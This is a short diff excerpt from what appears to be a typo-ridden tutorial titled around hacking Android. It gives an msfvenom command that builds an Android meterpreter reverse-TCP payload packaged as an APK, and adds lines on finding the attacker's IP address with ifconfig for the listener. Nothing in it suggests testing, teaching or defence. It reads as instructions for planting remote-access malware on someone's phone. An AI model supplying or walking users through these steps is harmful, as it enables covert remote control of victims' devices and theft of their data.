@@ -5,4 +5,6 @@ Requorements to hack android::::::::::
 Then to hack android we need to genarate payload apk through metasploit software
 Genarate apk 
 msfvenom -p android/meterpreter/reverse_tcp LHOST=your ip adress  LPORT=4444 - o name.apk
+to find your ip adrees open another terminal type ifconfig
+You will fynd your internet adress port will be same
 
